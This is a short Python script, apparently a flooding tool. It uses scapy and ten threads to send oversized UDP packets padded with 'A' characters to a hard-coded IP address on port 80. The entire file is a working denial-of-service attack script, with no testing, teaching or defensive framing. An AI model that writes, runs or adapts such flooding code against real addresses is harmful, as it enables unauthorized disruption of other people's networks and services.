import threading
import logging
from scapy.all import *
def send_large_packet(target_ip, target_port, packet_size):
    try:
        packet = IP(dst=target_ip)/UDP(dport=target_port)/("A" * packet_size)
        send(packet, verbose=0)
        
        logging.info(f"[+] Sent packet with size {packet_size} bytes to {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"[ERROR] {e}")
target_ip = "130.185.74.255" 
target_port = 80
packet_size = 6666 
num_packets = 100

num_threads = 10
def send_packets(num_packets):
    for i in range(num_packets):
        send_large_packet(target_ip, target_port, packet_size)
threads = []
for i in range(num_threads):
    t = threading.Thread(target=send_packets, args=(num_packets//num_threads,))
    threads.append(t)
    t.start()
for t in threads:
    t.join()

logging.info("Packets sent successfully.")

